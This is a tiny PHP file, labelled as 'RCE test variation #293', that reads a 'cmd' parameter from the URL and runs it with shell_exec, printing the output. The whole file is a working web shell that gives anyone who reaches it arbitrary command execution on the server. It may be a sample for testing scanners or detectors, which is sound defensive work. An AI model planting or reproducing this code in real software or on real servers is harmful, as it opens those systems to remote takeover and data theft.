<?php
// RCE test variation #293
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>